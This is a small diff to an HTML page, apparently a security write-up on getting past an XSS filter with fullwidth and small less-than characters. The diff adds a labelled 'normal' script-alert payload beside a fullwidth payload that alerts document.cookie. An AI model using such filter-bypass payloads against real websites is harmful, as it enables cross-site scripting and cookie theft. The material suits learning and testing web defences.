@@ -50,4 +50,5 @@
 <h2>Finding a Working Exploit</h2>
 <p>With our new discovery of 'fullwidth less-than' and 'small less-than' signs we can try modify our orginal payload to pop our alert.</p>
 
-<pre><code>＜script＞alert(document.cookie)＜/script＞</code></pre>
+<pre><code>＜script＞alert(document.cookie)＜/script＞ // Full-width Payload
+&lt;script&gt;alert(1)&lt;/script&gt; // Normal Payload</code></pre>
